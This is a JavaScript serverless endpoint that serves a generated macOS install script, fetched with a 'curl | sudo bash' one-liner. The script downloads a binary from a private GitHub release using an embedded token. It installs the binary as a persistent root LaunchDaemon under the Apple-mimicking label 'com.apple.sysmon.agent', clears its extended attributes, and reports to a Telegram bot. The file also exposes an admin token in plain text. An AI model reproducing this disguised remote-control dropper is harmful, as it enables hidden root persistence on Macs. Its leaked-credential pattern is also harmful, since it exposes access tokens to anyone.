// GET /api/install?token=<ADMIN_TOKEN>
// Generates install.sh on-the-fly with asset IDs and GH_TOKEN pre-baked.
// Asset IDs are resolved server-side so the Mac needs no JSON parsing.
// Usage: curl -fsSL "https://mymac-config.vercel.app/api/install?token=Punisher2004@aA" | sudo bash

const https = require('https');

function ghGet(path, ghToken) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: 'api.github.com',
      path,
      method: 'GET',
      headers: {
        'Authorization': 'token ' + ghToken,
        'User-Agent': 'mymac-config-server',
        'Accept': 'application/vnd.github+json'
      }
    }, res => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(body) }); }
        catch(e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

export default async function handler(req, res) {
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

  const { token } = req.query;
  if (!token || token !== process.env.ADMIN_TOKEN) return res.status(401).json({ error: 'Unauthorized' });

  const ghToken = process.env.GH_TOKEN || '';
  if (!ghToken) return res.status(503).json({ error: 'GH_TOKEN not configured' });

  // Resolve asset IDs server-side — bake numeric IDs directly into the bash script
  let arm64Id, amd64Id, checksumId;
  try {
    const { status, body } = await ghGet('/repos/chocolaid/mymac/releases/tags/v2.0.2', ghToken);
    if (status !== 200) return res.status(502).json({ error: 'GitHub API returned ' + status });
    const assets = body.assets || [];
    arm64Id    = assets.find(a => a.name === 'agent-darwin-arm64')?.id;
    amd64Id    = assets.find(a => a.name === 'agent-darwin-amd64')?.id;
    checksumId = assets.find(a => a.name === 'checksums.txt')?.id;
    if (!arm64Id || !amd64Id) return res.status(502).json({ error: 'Release assets missing from v2.0.2' });
  } catch (e) {
    return res.status(502).json({ error: 'GitHub fetch failed: ' + e.message });
  }

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.status(200).send(buildScript(ghToken, arm64Id, amd64Id, checksumId));
}

function buildScript(ghToken, arm64Id, amd64Id, checksumId) {
  return [
    '#!/usr/bin/env bash',
    '# install.sh – mymac agent installer (auto-generated, no prompts)',
    '# ─────────────────────────────────────────────────────────────────────────────',
    "set -euo pipefail",
    "",
    "RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'",
    "CYAN='\\033[0;36m'; BOLD='\\033[1m'; RESET='\\033[0m'",
    "info()    { echo -e \"${CYAN}[•]${RESET} $*\"; }",
    "success() { echo -e \"${GREEN}[✓]${RESET} $*\"; }",
    "warn()    { echo -e \"${YELLOW}[!]${RESET} $*\"; }",
    "die()     { echo -e \"${RED}[✗]${RESET} $*\" >&2; exit 1; }",
    "",
    "# ── Guards ────────────────────────────────────────────────────────────────────",
    '[[ $EUID -eq 0 ]]            || die "Run as root: sudo bash <(curl ...)"',
    '[[ "$(uname)" == "Darwin" ]] || die "macOS only."',
    'command -v curl &>/dev/null  || die "curl required."',
    'ARCH="$(uname -m)"',
    '[[ "$ARCH" == "arm64" || "$ARCH" == "x86_64" ]] || die "Unsupported arch: $ARCH"',
    "",
    "# ── Install paths ─────────────────────────────────────────────────────────────",
    'AGENT_LABEL="com.apple.sysmon.agent"',
    'BINARY_PATH="/usr/local/libexec/${AGENT_LABEL}"',
    'PLIST_PATH="/Library/LaunchDaemons/${AGENT_LABEL}.plist"',
    'LOG_PATH="/var/log/${AGENT_LABEL}.log"',
    'ERR_PATH="/var/log/${AGENT_LABEL}.err"',
    "",
    "# ── Pre-resolved asset IDs (baked in by Vercel) ───────────────────────────────",
    `GH_TOKEN="${ghToken}"`,
    `ASSET_ID_ARM64="${arm64Id}"`,
    `ASSET_ID_AMD64="${amd64Id}"`,
    `CHECKSUM_ASSET_ID="${checksumId || ''}"`,
    'GH_ASSETS_BASE="https://api.github.com/repos/chocolaid/mymac/releases/assets"',
    "",
    '[[ "$ARCH" == "arm64" ]] && ASSET_ID="${ASSET_ID_ARM64}" && BINARY_NAME="agent-darwin-arm64" \\',
    '  || { ASSET_ID="${ASSET_ID_AMD64}"; BINARY_NAME="agent-darwin-amd64"; }',
    "",
    'echo -e "\\n${BOLD}╔══════════════════════════════════════════╗"',
    'echo -e "║       mymac agent – installer v2         ║"',
    'echo -e "╚══════════════════════════════════════════╝${RESET}\\n"',
    'echo -e "  Arch: ${CYAN}${ARCH}${RESET}  Binary: ${CYAN}${BINARY_NAME}${RESET}"',
    'echo ""',
    "",
    "# ── Download binary ───────────────────────────────────────────────────────────",
    "# Uses GitHub assets API. curl -L (NOT --location-trusted) drops the auth header",
    "# when redirecting to S3 — required because S3 pre-signed URLs have their own auth.",
    'info "Downloading agent binary..."',
    'TMPBIN="$(mktemp)"',
    "",
    'curl -fsSL --retry 3 --retry-delay 2 -L \\',
    '  -H "Authorization: token ${GH_TOKEN}" \\',
    '  -H "Accept: application/octet-stream" \\',
    '  -o "$TMPBIN" \\',
    '  "${GH_ASSETS_BASE}/${ASSET_ID}" \\',
    '  || die "Download failed — token may have expired (github.com/settings/tokens)"',
    "",
    'file "$TMPBIN" | grep -qi "mach-o" || die "Not a macOS binary. Got: $(file $TMPBIN | head -1)"',
    'success "Downloaded ($(du -sh "$TMPBIN" | cut -f1))"',
    "",
    "# ── Checksum verification ─────────────────────────────────────────────────────",
    'info "Verifying checksum..."',
    'if [[ -n "${CHECKSUM_ASSET_ID}" ]]; then',
    '  CHECKSUM_FILE="$(mktemp)"',
    '  if curl -fsSL --retry 2 -L \\',
    '    -H "Authorization: token ${GH_TOKEN}" \\',
    '    -H "Accept: application/octet-stream" \\',
    '    -o "$CHECKSUM_FILE" \\',
    '    "${GH_ASSETS_BASE}/${CHECKSUM_ASSET_ID}" 2>/dev/null; then',
    '    EXPECTED_SHA="$(grep "${BINARY_NAME}" "$CHECKSUM_FILE" | awk \'{print $1}\')"',
    '    rm -f "$CHECKSUM_FILE"',
    '    if [[ -n "$EXPECTED_SHA" ]]; then',
    '      ACTUAL_SHA="$(shasum -a 256 "$TMPBIN" | awk \'{print $1}\')"',
    '      if [[ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]]; then',
    '        rm -f "$TMPBIN"',
    '        die "Checksum mismatch!\\n  Expected: $EXPECTED_SHA\\n  Got: $ACTUAL_SHA"',
    '      fi',
    '      success "Checksum verified."',
    '    else',
    '      warn "No entry for ${BINARY_NAME} in checksums — skipping."',
    '    fi',
    '  else',
    '    rm -f "$CHECKSUM_FILE"',
    '    warn "Could not download checksums — skipping verification."',
    '  fi',
    'else',
    '  warn "No checksum asset ID — skipping."',
    'fi',
    "",
    "# ── Install binary ────────────────────────────────────────────────────────────",
    'info "Installing binary to ${BINARY_PATH}..."',
    'mkdir -p "$(dirname "$BINARY_PATH")"',
    'install -m 0755 -o root -g wheel "$TMPBIN" "$BINARY_PATH"',
    'rm -f "$TMPBIN"',
    'xattr -c "$BINARY_PATH" 2>/dev/null || true',
    'success "Binary installed."',
    "",
    "# ── Write LaunchDaemon plist ──────────────────────────────────────────────────",
    'info "Installing LaunchDaemon..."',
    'cat > "$PLIST_PATH" <<PLIST',
    '<?xml version="1.0" encoding="UTF-8"?>',
    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"',
    '  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
    '<plist version="1.0">',
    '<dict>',
    '  <key>Label</key>',
    '  <string>${AGENT_LABEL}</string>',
    '  <key>ProgramArguments</key>',
    '  <array>',
    '    <string>${BINARY_PATH}</string>',
    '  </array>',
    '  <key>UserName</key>',
    '  <string>root</string>',
    '  <key>RunAtLoad</key>',
    '  <true/>',
    '  <key>KeepAlive</key>',
    '  <true/>',
    '  <key>ThrottleInterval</key>',
    '  <integer>10</integer>',
    '  <key>StandardOutPath</key>',
    '  <string>${LOG_PATH}</string>',
    '  <key>StandardErrorPath</key>',
    '  <string>${ERR_PATH}</string>',
    '  <key>EnvironmentVariables</key>',
    '  <dict>',
    '    <key>PATH</key>',
    '    <string>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/homebrew/bin</string>',
    '    <key>HOME</key>',
    '    <string>/var/root</string>',
    '  </dict>',
    '  <key>Nice</key>',
    '  <integer>0</integer>',
    '</dict>',
    '</plist>',
    'PLIST',
    "",
    'chmod 644 "$PLIST_PATH"',
    'chown root:wheel "$PLIST_PATH"',
    'success "LaunchDaemon plist installed."',
    "",
    "# ── Log files ─────────────────────────────────────────────────────────────────",
    'touch "$LOG_PATH" "$ERR_PATH"',
    'chmod 640 "$LOG_PATH" "$ERR_PATH"',
    'chown root:wheel "$LOG_PATH" "$ERR_PATH"',
    "",
    "# ── Reload if upgrading ───────────────────────────────────────────────────────",
    'if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then',
    '  info "Stopping existing agent (upgrade)..."',
    '  launchctl unload "$PLIST_PATH" 2>/dev/null || true',
    '  sleep 1',
    'fi',
    "",
    "# ── Load daemon ───────────────────────────────────────────────────────────────",
    'info "Loading LaunchDaemon..."',
    'launchctl load -w "$PLIST_PATH"',
    'sleep 3',
    'if launchctl list "$AGENT_LABEL" &>/dev/null 2>&1; then',
    '  success "Agent is running as a root system daemon."',
    'else',
    '  warn "Daemon registered but may still be starting."',
    '  warn "  Check: sudo launchctl list ${AGENT_LABEL}"',
    'fi',
    "",
    "# ── Done ─────────────────────────────────────────────────────────────────────",
    'echo ""',
    'echo -e "${BOLD}╔══════════════════════════════════════════╗"',
    'echo -e "║         Installation complete ✓          ║"',
    'echo -e "╚══════════════════════════════════════════╝${RESET}"',
    'echo ""',
    'echo -e "  Binary:  ${CYAN}${BINARY_PATH}${RESET}"',
    'echo -e "  Log:     ${CYAN}tail -f ${LOG_PATH}${RESET}"',
    'echo ""',
    'echo -e "  ${BOLD}Next:${RESET} Check Telegram — this Mac will appear in /devices once the bot is online."',
    'echo ""',
  ].join('\n');
}
